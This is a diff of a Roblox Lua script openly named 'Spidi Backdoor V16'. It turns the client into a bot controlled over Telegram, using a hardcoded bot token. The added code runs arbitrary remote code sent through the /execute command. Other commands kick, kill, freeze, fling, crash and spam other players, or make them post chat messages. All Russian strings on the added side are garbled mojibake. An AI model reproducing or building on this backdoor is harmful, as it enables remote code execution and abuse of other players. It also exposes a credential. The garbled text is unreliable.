@@ -7,16 +7,11 @@
   Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER
 ]=]
 
-local function saveScript()
-    local writefile = syn and syn.writefile or writefile or fluxus and fluxus.writefile
-    if not writefile then return false end
-    
-    local scriptPath = "SpidiBackdoor.lua"
-    local fullScript = [=[
 repeat wait() until game:IsLoaded()
 
 local BOT_TOKEN = "8778091630:AAEvqz_bo9fat2Or2Q_XYeeMWS2QBFPMRXc"
 local CHAT_ID = nil
+local LAST_ID = 0
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
@@ -31,7 +26,6 @@ local MarketplaceService = game:GetService("MarketplaceService")
 local RunService = game:GetService("RunService")
 local SoundService = game:GetService("SoundService")
 local TweenService = game:GetService("TweenService")
-local UserInputService = game:GetService("UserInputService")
 
 local function req(url, method, headers, body)
     local f = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request
@@ -62,11 +56,15 @@ end
 
 local scriptUsers = {}
 local myPlayer = Players.LocalPlayer
+local active = {}
+local stunned = {}
+local spinning = {}
+local cd = {}
 
 local function addUser(p)
     if not scriptUsers[p.UserId] then
         scriptUsers[p.UserId] = p
-        send("🟢 <b>"..p.Name.."</b> подключился!")
+        send("рџџў <b>"..p.Name.."</b> РїРѕРґРєР»СЋС‡РёР»СЃСЏ!")
     end
 end
 
@@ -77,7 +75,7 @@ m.Name = "SpidiUser"
 m.Parent = myPlayer
 
 local function findPlayer(inp)
-    if not inp or inp == "" then return nil, "❌ Введи ник" end
+    if not inp or inp == "" then return nil, "вќЊ Р’РІРµРґРё РЅРёРє" end
     local users = {}
     for _, p in pairs(Players:GetPlayers()) do
         if scriptUsers[p.UserId] then table.insert(users, p) end
@@ -95,8 +93,8 @@ local function findPlayer(inp)
     elseif #matches > 1 then
         local names = {}
         for _, p in pairs(matches) do table.insert(names, p.Name) end
-        return nil, "Найдено несколько: "..table.concat(names, ", ")
-    else return nil, "Игрок не найден" end
+        return nil, "РќР°Р№РґРµРЅРѕ РЅРµСЃРєРѕР»СЊРєРѕ: "..table.concat(names, ", ")
+    else return nil, "РРіСЂРѕРє РЅРµ РЅР°Р№РґРµРЅ" end
 end
 
 local function getUsers()
@@ -115,73 +113,581 @@ local function getAll()
     local list = {}
     local i = 1
     for _, p in pairs(Players:GetPlayers()) do
-        local hs = scriptUsers[p.UserId] and " 🔥" or ""
+        local hs = scriptUsers[p.UserId] and " рџ”Ґ" or ""
         table.insert(list, i..". "..p.Name..hs)
         i = i + 1
     end
     return list
 end
 
-local function handleCommand(cmd, args)
-    if cmd == "start" then
-        send("✅ Spidi V16 запущен!\n👤 Hacker228")
+-- ==================== РџРћР›РќР«Р™ РЎР‘Р РћРЎ ====================
+local function fullReset()
+    -- РћСЃС‚Р°РЅР°РІР»РёРІР°РµРј РІСЃРµ Р°РєС‚РёРІРЅС‹Рµ РїСЂРѕС†РµСЃСЃС‹
+    for _, d in pairs(active) do
+        if d.conn then pcall(d.conn.Disconnect, d.conn) end
+        if d.run then d.run = false end
+    end
+    active = {}
+    
+    -- РћСЃС‚Р°РЅР°РІР»РёРІР°РµРј РІСЂР°С‰РµРЅРёСЏ
+    for _, p in pairs(spinning) do
+        p.run = false
+    end
+    spinning = {}
+    
+    -- РЎРЅРёРјР°РµРј РѕРіР»СѓС€РµРЅРёСЏ
+    stunned = {}
+    
+    -- РЎР±СЂР°СЃС‹РІР°РµРј РљР”
+    cd = {}
+    
+    -- Р’РѕР·РІСЂР°С‰Р°РµРј РІСЃРµС… РёРіСЂРѕРєРѕРІ РІ РЅРѕСЂРјСѓ
+    for _, p in pairs(Players:GetPlayers()) do
+        if p.Character then
+            local hrp = p.Character:FindFirstChild("HumanoidRootPart")
+            if hrp then 
+                hrp.Anchored = false
+                hrp.CFrame = CFrame.new(hrp.Position)
+            end
+            local hum = p.Character:FindFirstChild("Humanoid")
+            if hum then
+                hum.WalkSpeed = 16
+                hum.JumpPower = 50
+                hum.Sit = false
+                hum.Health = 100
+                hum.MaxHealth = 100
+            end
+            -- РЈРґР°Р»СЏРµРј BodyVelocity
+            for _, v in pairs(p.Character:GetChildren()) do
+                if v:IsA("BodyVelocity") then v:Destroy() end
+            end
+        end
+    end
+    
+    -- РЈР±РёСЂР°РµРј Р±Р»СЋСЂ
+    local blur = Lighting:FindFirstChild("SpidiWarp")
+    if blur then blur:Destroy() end
+    
+    -- РЈР±РёСЂР°РµРј РјСѓР·С‹РєСѓ
+    local music = SoundService:FindFirstChild("ClientMusic")
+    if music then
+        music:Stop()
+        music:Destroy()
+    end
+    
+    -- РЎР±СЂР°СЃС‹РІР°РµРј РєР°РјРµСЂСѓ
+    local cam = Workspace.CurrentCamera
+    if cam then
+        cam.CameraType = Enum.CameraType.Custom
+    end
+    
+    send("рџ›‘ <b>РџРћР›РќР«Р™ РЎР‘Р РћРЎ!</b>\nвњ… Р’СЃРµ СЌС„С„РµРєС‚С‹ СѓР±СЂР°РЅС‹\nвњ… Р’СЃРµ РёРіСЂРѕРєРё РІРѕСЃСЃС‚Р°РЅРѕРІР»РµРЅС‹\nвњ… РџР°РјСЏС‚СЊ РѕР±РЅСѓР»РµРЅР°")
+end
+
+-- ==================== РњРЈР—Р«РљРђ ====================
+local function playMusic(id)
+    local old = SoundService:FindFirstChild("ClientMusic")
+    if old then old:Destroy() end
+    local s = Instance.new("Sound")
+    s.Name = "ClientMusic"
+    s.SoundId = "rbxassetid://"..tostring(id)
+    s.Volume = 1
+    s.Looped = true
+    s.Parent = SoundService
+    s:Play()
+end
+
+local function stopMusic()
+    local s = SoundService:FindFirstChild("ClientMusic")
+    if s then
+        s:Stop()
+        s:Destroy()
+        return true
+    end
+    return false
+end
+
+local function canSend(p)
+    local id = p.UserId
+    local last = cd[id] or 0
+    if tick() - last < 0.3 then return false end
+    cd[id] = tick()
+    return true
+end
+
+local function desorient(p)
+    local char = p.Character
+    if not char then return end
+    local cam = Workspace.CurrentCamera
+    if not cam then return end
+    cam.CameraType = Enum.CameraType.Scriptable
+    local st = tick()
+    local conn
+    conn = RunService.RenderStepped:Connect(function()
+        if tick() - st >= 3 then
+            conn:Disconnect()
+            cam.CameraType = Enum.CameraType.Custom
+            return
+        end
+        cam.CFrame = cam.CFrame * CFrame.Angles(math.rad(math.random(-15,15)), math.rad(25), math.rad(math.random(-10,10)))
+    end)
+    active[p.UserId] = {conn = conn}
+end
+
+local fpsCapped = false
+local function toggleFps()
+    fpsCapped = not fpsCapped
+    setfpscap(fpsCapped and 10 or 60)
+    return fpsCapped
+end
+
+local function say(p, msg)
+    if not p then return end
+    local ch = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+    if ch then
+        ch:SendAsync(msg)
         return
     end
+    local legacy = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+    if legacy then
+        local sayRemote = legacy:FindFirstChild("SayMessageRequest")
+        if sayRemote then sayRemote:FireServer(msg, "All") end
+    end
+end
+
+local function stun(p)
+    local char = p.Character
+    if not char then return end
+    local hum = char:FindFirstChild("Humanoid")
+    if not hum then return end
+    local os = hum.WalkSpeed
+    local oj = hum.JumpPower
+    hum.WalkSpeed = 0
+    hum.JumpPower = 0
+    stunned[p.UserId] = {speed = os, jump = oj}
+    task.delay(3, function()
+        if stunned[p.UserId] then
+            local d = stunned[p.UserId]
+            local h = p.Character and p.Character:FindFirstChild("Humanoid")
+            if h then
+                h.WalkSpeed = d.speed
+                h.JumpPower = d.jump
+            end
+            stunned[p.UserId] = nil
+        end
+    end)
+end
+
+local function fling(p)
+    local char = p.Character
+    if not char then return end
+    local hrp = char:FindFirstChild("HumanoidRootPart")
+    local hum = char:FindFirstChildOfClass("Humanoid")
+    if not (hrp and hum) then return end
+    hum.Sit = true
+    local dx = math.random() > 0.5 and 1 or -1
+    local dz = math.random() > 0.5 and 1 or -1
+    hrp.AssemblyLinearVelocity = Vector3.new(math.random(200,400)*dx, math.random(300,500), math.random(200,400)*dz)
+end
+
+local function spin(p, speed)
+    speed = speed or 1
+    speed = math.clamp(speed, 0.5, 10)
+    if spinning[p.UserId] then spinning[p.UserId] = nil end
+    local char = p.Character
+    if not char then return false end
+    local hrp = char:FindFirstChild("HumanoidRootPart")
+    if not hrp then return false end
+    local run = true
+    spinning[p.UserId] = {run = run}
+    active[p.UserId] = {run = run}
+    spawn(function()
+        while run and spinning[p.UserId] and spinning[p.UserId].run do
+            if not p.Character then break end
+            local h = p.Character:FindFirstChild("HumanoidRootPart")
+            if h then h.CFrame = h.CFrame * CFrame.Angles(0, math.rad(18*speed), 0) end
+            task.wait(0.05)
+        end
+    end)
+    return true
+end
+
+local function unspin(p)
+    if spinning[p.UserId] then
+        spinning[p.UserId].run = false
+        spinning[p.UserId] = nil
+        active[p.UserId] = nil
+        local char = p.Character
+        if char then
+            local hrp = char:FindFirstChild("HumanoidRootPart")
+            if hrp then hrp.CFrame = CFrame.new(hrp.Position) end
+        end
+        return true
+    end
+    return false
+end
+
+local function notify(p, text, dur)
+    dur = dur or 5
+    local gui = p:FindFirstChild("PlayerGui")
+    if not gui then return end
+    local screen = Instance.new("ScreenGui")
+    screen.Name = "SpidiNotif"
+    screen.ResetOnSpawn = false
+    screen.Parent = gui
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(0, 450, 0, 50)
+    frame.Position = UDim2.new(0.5, -225, 0, 20)
+    frame.BackgroundColor3 = Color3.fromRGB(10,10,20)
+    frame.BackgroundTransparency = 0.1
+    frame.BorderSizePixel = 0
+    frame.Parent = screen
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 10)
+    corner.Parent = frame
+    local stroke = Instance.new("UIStroke")
+    stroke.Color = Color3.fromRGB(0,255,0)
+    stroke.Thickness = 1
+    stroke.Parent = frame
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(1, -20, 1, 0)
+    label.Position = UDim2.new(0, 10, 0, 0)
+    label.BackgroundTransparency = 1
+    label.Text = text or ""
+    label.TextColor3 = Color3.fromRGB(255,255,255)
+    label.TextSize = 16
+    label.Font = Enum.Font.Gotham
+    label.TextXAlignment = Enum.TextXAlignment.Center
+    label.TextWrapped = true
+    label.Parent = frame
+    frame.BackgroundTransparency = 1
+    frame.Position = UDim2.new(0.5, -225, 0, -80)
+    TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        BackgroundTransparency = 0.1,
+        Position = UDim2.new(0.5, -225, 0, 20)
+    }):Play()
+    game:GetService("Debris"):AddItem(screen, dur)
+end
+
+local function handle(cmd, args)
+    local info = "рџ‘¤ Hacker228\nрџ”— https://www.roblox.com/games/"..game.PlaceId
+    
+    if cmd == "start" then
+        send("вњ… Spidi v16 Р°РєС‚РёРІРёСЂРѕРІР°РЅ!\n"..info)
+        return
+    end
+    
+    if cmd == "rm" then
+        fullReset()
+        return
+    end
+    
+    if cmd == "help" then
+        send("рџ“‹ <b>РљРћРњРђРќР”Р«:</b>\n/players - РїРѕР»СЊР·РѕРІР°С‚РµР»Рё\n/pc - РІСЃРµ РёРіСЂРѕРєРё\n/rm - РїРѕР»РЅС‹Р№ СЃР±СЂРѕСЃ\n/kick [РЅРёРє] [РїСЂРёС‡РёРЅР°]\n/ban [РЅРёРє] [РїСЂРёС‡РёРЅР°]\n/unban [РЅРёРє]\n/kill [РЅРёРє]\n/freeze [РЅРёРє]\n/unfreeze [РЅРёРє]\n/fly [РЅРёРє]\n/unfly [РЅРёРє]\n/crash [РЅРёРє]\n/fling [РЅРёРє]\n/teleport [РЅРёРє1] [РЅРёРє2]\n/bring [РЅРёРє1] [РЅРёРє2]\n/loopkill [РЅРёРє]\n/stun [РЅРёРє]\n/jump [РЅРёРє]\n/spin [РЅРёРє] [СЃРєРѕСЂРѕСЃС‚СЊ]\n/unspin [РЅРёРє]\n/explode [РЅРёРє]\n/des [РЅРёРє]\n/warp [РЅРёРє] [1-10]\n/unwarp [РЅРёРє]\n/music [Р°Р№РґРё]\n/unmusic\n/say [РЅРёРє] [С‚РµРєСЃС‚]\n/spam [РЅРёРє] [РєРѕР»-РІРѕ] [С‚РµРєСЃС‚]\n/message [РЅРёРє] [С‚РµРєСЃС‚]\n/announce [С‚РµРєСЃС‚]\n/players\n/pc\n/server\n/execute [РєРѕРґ]\n/setfps\n/help")
+        return
+    end
+    
     if cmd == "players" then
         local list = getUsers()
-        if #list == 0 then send("👥 Пользователей: 0") else send("👥 <b>Пользователи:</b>\n"..table.concat(list, "\n")) end
+        if #list == 0 then send("рџ‘Ґ РџРѕР»СЊР·РѕРІР°С‚РµР»РµР№: 0") else send("рџ‘Ґ <b>РџРѕР»СЊР·РѕРІР°С‚РµР»Рё:</b>\n"..table.concat(list, "\n")) end
         return
     end
+    
     if cmd == "pc" then
         local list = getAll()
-        if #list == 0 then send("👥 Игроков: 0") else send("👥 <b>Все игроки:</b>\n"..table.concat(list, "\n").."\n\n🔥 - Spidi") end
+        if #list == 0 then send("рџ‘Ґ РРіСЂРѕРєРѕРІ: 0") else send("рџ‘Ґ <b>Р’СЃРµ РёРіСЂРѕРєРё:</b>\n"..table.concat(list, "\n").."\n\nрџ”Ґ - Spidi") end
         return
     end
-    if cmd == "help" then
-        send("📋 Команды: /players, /pc, /kick, /ban, /unban, /help")
-        return
-    end
+    
     if cmd == "server" then
         local name = MarketplaceService:GetProductInfo(game.PlaceId).Name
         local count = 0
         for _, p in pairs(Players:GetPlayers()) do if scriptUsers[p.UserId] then count = count + 1 end end
-        send("🖥️ Сервер: "..name.."\nID: "..game.PlaceId.."\nИгроков: "..#Players:GetPlayers().."\nSpidi: "..count)
+        send("рџ–ҐпёЏ РЎРµСЂРІРµСЂ: "..name.."\nID: "..game.PlaceId.."\nРРіСЂРѕРєРѕРІ: "..#Players:GetPlayers().."\nSpidi: "..count)
         return
     end
-    if cmd == "rejoin" then
-        send("🔄 Перезаход...")
-        TeleportService:Teleport(game.PlaceId, Players.LocalPlayer)
+    
+    if cmd == "setfps" then
+        local state = toggleFps()
+        send("рџЋ® FPS: "..(state and "10" or "60"))
+        return
+    end
+    
+    if cmd == "execute" then
+        local code = table.concat(args, " ", 1)
+        if code == "" then send("вќЊ /execute РєРѕРґ") return end
+        send("вЏі Р’С‹РїРѕР»РЅРµРЅРёРµ...")
+        local ok, res = pcall(loadstring, code)
+        if ok then send("вњ… РљРѕРґ РІС‹РїРѕР»РЅРµРЅ\n"..info) else send("вќЊ РћС€РёР±РєР°: "..tostring(res)) end
+        return
+    end
+    
+    if cmd == "music" then
+        local id = args[1]
+        if not id then send("вќЊ /music [Р°Р№РґРё]") return end
+        playMusic(id)
+        send("рџЋµ РњСѓР·С‹РєР° РІРєР»СЋС‡РµРЅР°! ID: "..id)
+        return
+    end
+    
+    if cmd == "unmusic" then
+        if stopMusic() then send("рџ”‡ РњСѓР·С‹РєР° РІС‹РєР»СЋС‡РµРЅР°!") else send("вќЊ РњСѓР·С‹РєР° РЅРµ РёРіСЂР°РµС‚") end
+        return
+    end
+    
+    if cmd == "announce" then
+        local msg = table.concat(args, " ", 1)
+        if msg == "" then send("вќЊ /announce [С‚РµРєСЃС‚]") return end
+        StarterGui:SetCore("SendNotification", {Title = "", Text = msg, Duration = 10, Icon = ""})
+        send("вњ… РћР±СЉСЏРІР»РµРЅРёРµ: "..msg)
+        return
+    end
+    
+    if cmd == "say" then
+        local name = args[1]
+        local msg = table.concat(args, " ", 2)
+        if not name then send("вќЊ /say [РЅРёРє] [С‚РµРєСЃС‚]") return end
+        if msg == "" then send("вќЊ Р’РІРµРґРё С‚РµРєСЃС‚") return end
+        local target, err = findPlayer(name)
+        if not target then send("вќЊ "..err) return end
+        say(target, msg)
+        send("вњ… РЎРєР°Р·Р°РЅРѕ РѕС‚ <b>"..target.Name.."</b>: "..msg)
+        return
+    end
+    
+    if cmd == "spam" then
+        local name = args[1]
+        local count = tonumber(args[2]) or 5
+        local msg = table.concat(args, " ", 3)
+        if not name then send("вќЊ /spam [РЅРёРє] [РєРѕР»-РІРѕ] [С‚РµРєСЃС‚]") return end
+        if msg == "" then send("вќЊ Р’РІРµРґРё С‚РµРєСЃС‚") return end
+        local target, err = findPlayer(name)
+        if not target then send("вќЊ "..err) return end
+        for i = 1, math.min(count, 20) do
+            task.wait(0.1)
+            say(target, msg.." "..i)
+        end
+        send("вњ… РЎРїР°Рј РѕС‚ <b>"..target.Name.."</b> ("..math.min(count,20).." СЂР°Р·)")
+        return
+    end
+    
+    if cmd == "message" then
+        local name = args[1]
+        local msg = table.concat(args, " ", 2)
+        if not name then send("вќЊ /message [РЅРёРє] [С‚РµРєСЃС‚]") return end
+        if msg == "" then send("вќЊ Р’РІРµРґРё С‚РµРєСЃС‚") return end
+        local target, err = findPlayer(name)
+        if not target then send("вќЊ "..err) return end
+        if not canSend(target) then send("вЏі РџРѕРґРѕР¶РґРё 0.3 СЃРµРє") return end
+        notify(target, msg, 5)
+        send("вњ… РЎРѕРѕР±С‰РµРЅРёРµ <b>"..target.Name.."</b>: "..msg)
+        return
+    end
+    
+    if cmd == "teleport" or cmd == "bring" then
+        local n1 = args[1]
+        local n2 = args[2]
+        if not n1 or not n2 then send("вќЊ /"..cmd.." [РЅРёРє1] [РЅРёРє2]") return end
+        local t1, e1 = findPlayer(n1)
+        if not t1 then send("вќЊ "..e1) return end
+        local t2, e2 = findPlayer(n2)
+        if not t2 then send("вќЊ "..e2) return end
+        local h1 = t1.Character and t1.Character:FindFirstChild("HumanoidRootPart")
+        local h2 = t2.Character and t2.Character:FindFirstChild("HumanoidRootPart")
+        if not h1 or not h2 then send("вќЊ РќРµС‚ РїРµСЂСЃРѕРЅР°Р¶Р°") return end
+        if cmd == "teleport" then
+            h1.CFrame = h2.CFrame + Vector3.new(0,3,0)
+            send("рџ“Ќ <b>"..t1.Name.."</b> Рє <b>"..t2.Name.."</b>")
+        else
+            h2.CFrame = h1.CFrame + Vector3.new(0,3,0)
+            send("рџ“Ќ <b>"..t2.Name.."</b> Рє <b>"..t1.Name.."</b>")
+        end
         return
     end
     
     local name = args[1]
-    if not name then send("❌ Укажи ник") return end
+    if not name then send("вќЊ РЈРєР°Р¶Рё РЅРёРє") return end
     local target, err = findPlayer(name)
-    if not target then send("❌ "..err) return end
+    if not target then send("вќЊ "..err) return end
     
     if target == myPlayer then
         if cmd == "kick" or cmd == "ban" then
-            send("❌ Нельзя кикнуть/забанить себя!")
+            send("вќЊ РќРµР»СЊР·СЏ РєРёРєРЅСѓС‚СЊ/Р·Р°Р±Р°РЅРёС‚СЊ СЃРµР±СЏ!")
             return
         end
     end
     
+    local char = target.Character
+    local hrp = char and char:FindFirstChild("HumanoidRootPart")
+    local hum = char and char:FindFirstChild("Humanoid")
+    
     if cmd == "kick" then
-        target:Kick("Kicked by Spidi")
-        send("✅ Кикнут: <b>"..target.Name.."</b>")
+        local reason = table.concat(args, " ", 2)
+        if reason == "" or reason == name then target:Kick("Kicked by Spidi") else target:Kick(reason) end
+        send("вњ… РљРёРєРЅСѓС‚: <b>"..target.Name.."</b>"..(reason ~= "" and reason ~= name and " (РџСЂРёС‡РёРЅР°: "..reason..")" or ""))
         return
     end
+    
     if cmd == "ban" then
-        target:Kick("Banned by Spidi")
-        send("✅ Забанен: <b>"..target.Name.."</b>")
+        local reason = table.concat(args, " ", 2)
+        if reason == "" or reason == name then target:Kick("Banned by Spidi") else target:Kick(reason) end
+        send("вњ… Р—Р°Р±Р°РЅРµРЅ: <b>"..target.Name.."</b>"..(reason ~= "" and reason ~= name and " (РџСЂРёС‡РёРЅР°: "..reason..")" or ""))
         return
     end
+    
     if cmd == "unban" then
         target:Kick("Unbanned by Spidi")
-        send("✅ Разбанен: <b>"..target.Name.."</b>")
+        send("вњ… Р Р°Р·Р±Р°РЅРµРЅ: <b>"..target.Name.."</b>")
         return
     end
-    send("❌ Неизвестная команда. /help")
+    
+    if cmd == "kill" and hum then
+        hum.Health = 0
+        send("рџ’Ђ РЈР±РёС‚: <b>"..target.Name.."</b>")
+        return
+    end
+    
+    if cmd == "freeze" and hrp and hum then
+        hrp.Anchored = true
+        hum.WalkSpeed = 0
+        hum.JumpPower = 0
+        send("рџ§Љ Р—Р°РјРѕСЂРѕР¶РµРЅ: <b>"..target.Name.."</b>")
+        return
+    end
+    
+    if cmd == "unfreeze" and hrp and hum then
+        hrp.Anchored = false
+        hum.WalkSpeed = 16
+        hum.JumpPower = 50
+        send("рџ”Ґ Р Р°Р·РјРѕСЂРѕР¶РµРЅ: <b>"..target.Name.."</b>")
+        return
+    end
+    
+    if cmd == "fly" and hrp then
+        local bv = Instance.new("BodyVelocity")
+        bv.MaxForce = Vector3.new(1,1,1)*1e8
+        bv.Velocity = Vector3.new(0,50,0)
+        bv.Parent = hrp
+        Debris:AddItem(bv,5)
+        send("вњ€пёЏ РџРѕР»РµС‚РµР»: <b>"..target.Name.."</b>")
+        return
+    end
+    
+    if cmd == "unfly" and hrp then
+        for _, v in pairs(hrp:GetChildren()) do if v:IsA("BodyVelocity") then v:Destroy() end end
+        send("рџ›‘ РћС‚РєР»СЋС‡РµРЅ РїРѕР»РµС‚: <b>"..target.Name.."</b>")
+        return
+    end
+    
+    if cmd == "crash" and hrp then
+        local pos = hrp.Position
+        for i = 1, 100 do
+            local p = Instance.new("Part")
+            p.Size = Vector3.new(5,5,5)
+            p.Position = pos + Vector3.new(math.random(-50,50), math.random(-50,50), math.random(-50,50))
+            p.Anchored = true
+            p.Parent = Workspace
+            Debris:AddItem(p,2)
+        end
+        send("рџ’Ґ РљСЂР°С€РЅСѓС‚: <b>"..target.Name.."</b>")
+        return
+    end
+    
+    if cmd == "fling" then
+        fling(target)
+        send("рџЊЂ Р¤Р»РёРЅРі РЅР° <b>"..target.Name.."</b>")
+        return
+    end
+    
+    if cmd == "loopkill" and hum then
+        spawn(function()
+            for i = 1, 10 do
+                if not target or not target.Character then break end
+                local h = target.Character:FindFirstChild("Humanoid")
+                if h then h.Health = 0 end
+                task.wait(0.5)
+            end
+        end)
+        send("рџ”„ Loopkill РЅР° <b>"..target.Name.."</b>")
+        return
+    end
+    
+    if cmd == "stun" and hum then
+        stun(target)
+        send("вљЎ РћРіР»СѓС€РµРЅ РЅР° 3 СЃРµРє: <b>"..target.Name.."</b>")
+        return
+    end
+    
+    if cmd == "jump" and hum then
+        hum.Jump = true
+        send("рџ¦ РџСЂС‹Р¶РѕРє: <b>"..target.Name.."</b>")
+        return
+    end
+    
+    if cmd == "spin" then
+        local speed = tonumber(args[2]) or 1
+        speed = math.clamp(speed, 0.5, 10)
+        if spin(target, speed) then
+            send("рџ”„ Р’СЂР°С‰РµРЅРёРµ ("..speed.."x): <b>"..target.Name.."</b>")
+        else
+            send("вќЊ РќРµС‚ РїРµСЂСЃРѕРЅР°Р¶Р°")
+        end
+        return
+    end
+    
+    if cmd == "unspin" then
+        if unspin(target) then send("вњ… РћСЃС‚Р°РЅРѕРІР»РµРЅРѕ: <b>"..target.Name.."</b>") else send("вќЊ Р’СЂР°С‰РµРЅРёРµ РЅРµ Р°РєС‚РёРІРЅРѕ") end
+        return
+    end
+    
+    if cmd == "explode" and hrp then
+        local pos = hrp.Position
+        for i = 1, 30 do
+            local p = Instance.new("Part")
+            p.Size = Vector3.new(3,3,3)
+            p.Position = pos + Vector3.new(math.random(-20,20), math.random(-20,20), math.random(-20,20))
+            p.Anchored = true
+            p.Material = Enum.Material.Neon
+            p.BrickColor = BrickColor.new("Bright red")
+            p.Parent = Workspace
+            Debris:AddItem(p,1)
+        end
+        send("рџ’Ґ Р’Р·СЂС‹РІ: <b>"..target.Name.."</b>")
+        return
+    end
+    
+    if cmd == "des" then
+        desorient(target)
+        send("рџЊЂ Р”РµР·РѕСЂРёРµРЅС‚Р°С†РёСЏ (3 СЃРµРє): <b>"..target.Name.."</b>")
+        return
+    end
+    
+    if cmd == "warp" then
+        local level = tonumber(args[2]) or 5
+        level = math.clamp(level, 1, 10)
+        local blur = Lighting:FindFirstChild("SpidiWarp")
+        if not blur then
+            blur = Instance.new("BlurEffect")
+            blur.Name = "SpidiWarp"
+            blur.Parent = Lighting
+        end
+        blur.Size = level * 3
+        send("рџЊЂ Р Р°Р·РјС‹С‚РёРµ "..level.."/10 РЅР° <b>"..target.Name.."</b>")
+        return
+    end
+    
+    if cmd == "unwarp" then
+        local blur = Lighting:FindFirstChild("SpidiWarp")
+        if blur then
+            blur:Destroy()
+            send("вњ… Р Р°Р·РјС‹С‚РёРµ СѓР±СЂР°РЅРѕ Сѓ <b>"..target.Name.."</b>")
+        else
+            send("вќЊ РќРµС‚ СЂР°Р·РјС‹С‚РёСЏ Сѓ <b>"..target.Name.."</b>")
+        end
+        return
+    end
+    
+    send("вќЊ РќРµРёР·РІРµСЃС‚РЅР°СЏ РєРѕРјР°РЅРґР°. /help")
 end
 
 local oldPlayers = {}
@@ -213,7 +719,7 @@ local function poll()
                     local msg = upd.message
                     if not CHAT_ID then
                         CHAT_ID = msg.chat.id
-                        send("✅ Spidi V16 запущен!\n👤 Hacker228")
+                        send("вњ… Spidi v16 Р·Р°РїСѓС‰РµРЅ!\nрџ‘¤ Hacker228")
                     end
                     local text = msg.text
                     if text:sub(1,1) == "/" then
@@ -221,7 +727,7 @@ local function poll()
                         for w in string.gmatch(text, "%S+") do table.insert(parts, w) end
                         local cmd = parts[1]:sub(2):lower()
                         table.remove(parts, 1)
-                        handleCommand(cmd, parts)
+                        handle(cmd, parts)
                     end
                 end
                 if upd.update_id then lastId = upd.update_id end
@@ -237,126 +743,8 @@ spawn(function()
     end
 end)
 
-local function createGUI()
-    local player = Players.LocalPlayer
-    if not player then return end
-    local gui = player:FindFirstChild("PlayerGui")
-    if not gui then gui = Instance.new("PlayerGui", player) end
-    local screen = Instance.new("ScreenGui")
-    screen.Name = "Spidi Backdoor"
-    screen.ResetOnSpawn = false
-    screen.Parent = gui
-    local frame = Instance.new("Frame")
-    frame.BackgroundColor3 = Color3.fromRGB(0,0,0)
-    frame.Size = UDim2.new(0, 482, 0, 276)
-    frame.Position = UDim2.new(0.5, -241, 0.5, -138)
-    frame.Active = true
-    frame.Parent = screen
-    local stroke = Instance.new("UIStroke")
-    stroke.Thickness = 2
-    stroke.Color = Color3.fromRGB(255,255,255)
-    stroke.Parent = frame
-    local grad = Instance.new("UIGradient")
-    grad.Rotation = 50
-    grad.Color = ColorSequence.new({
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(255,0,0)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(0,255,0))
-    })
-    grad.Parent = stroke
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0, 12)
-    corner.Parent = frame
-    local title = Instance.new("TextLabel")
-    title.BackgroundTransparency = 1
-    title.Size = UDim2.new(1,0,0,50)
-    title.Position = UDim2.new(0,0,0,10)
-    title.Text = "Spidi Backdoor V16"
-    title.TextColor3 = Color3.fromRGB(0,255,0)
-    title.TextSize = 36
-    title.Font = Enum.Font.GothamBold
-    title.TextXAlignment = Enum.TextXAlignment.Center
-    title.Parent = frame
-    local desc = Instance.new("TextLabel")
-    desc.BackgroundTransparency = 1
-    desc.Size = UDim2.new(1,-40,0,80)
-    desc.Position = UDim2.new(0,20,0,70)
-    desc.Text = "Spidi Backdoor Active!\nCommands Available"
-    desc.TextColor3 = Color3.fromRGB(0,255,0)
-    desc.TextSize = 18
-    desc.Font = Enum.Font.GothamBold
-    desc.TextWrapped = true
-    desc.TextXAlignment = Enum.TextXAlignment.Center
-    desc.Parent = frame
-    local btn = Instance.new("TextButton")
-    btn.BackgroundColor3 = Color3.fromRGB(60,60,80)
-    btn.Size = UDim2.new(0,140,0,40)
-    btn.Position = UDim2.new(0.5,-70,0.75,0)
-    btn.Text = "OK"
-    btn.TextColor3 = Color3.fromRGB(255,255,255)
-    btn.TextSize = 18
-    btn.Font = Enum.Font.GothamBold
-    btn.Parent = frame
-    local btnCorner = Instance.new("UICorner")
-    btnCorner.CornerRadius = UDim.new(0,6)
-    btnCorner.Parent = btn
-    btn.MouseButton1Click:Connect(function() screen:Destroy() end)
-    local drag = false
-    local startPos, startMouse, dragInput
-    frame.InputBegan:Connect(function(inp)
-        if (inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch) and not UserInputService:GetFocusedTextBox() then
-            drag = true
-            startPos = frame.Position
-            startMouse = inp.Position
-            inp.Changed:Connect(function()
-                if inp.UserInputState == Enum.UserInputState.End then drag = false end
-            end)
-        end
-    end)
-    frame.InputChanged:Connect(function(inp)
-        if inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch then
-            dragInput = inp
-        end
-    end)
-    UserInputService.InputChanged:Connect(function(inp)
-        if inp == dragInput and drag then
-            local delta = inp.Position - startMouse
-            frame.Position = UDim2.new(
-                startPos.X.Scale,
-                startPos.X.Offset + delta.X,
-                startPos.Y.Scale,
-                startPos.Y.Offset + delta.Y
-            )
-        end
-    end)
-end
-
-createGUI()
 wait(3)
 getChat()
 if CHAT_ID then
-    send("✅ Spidi V16 запущен!\n👤 Hacker228\n/players - пользователи\n/pc - все игроки\n/help - команды")
+    send("вњ… Spidi v16 Р·Р°РїСѓС‰РµРЅ!\nрџ‘¤ Hacker228\n/players - РїРѕР»СЊР·РѕРІР°С‚РµР»Рё\n/pc - РІСЃРµ РёРіСЂРѕРєРё\n/rm - РїРѕР»РЅС‹Р№ СЃР±СЂРѕСЃ")
 end
-]=]
-
-    writefile(scriptPath, fullScript)
-    print("[Spidi] ✅ Скрипт сохранён: "..scriptPath)
-    return true
-end
-
-local function autoExecute()
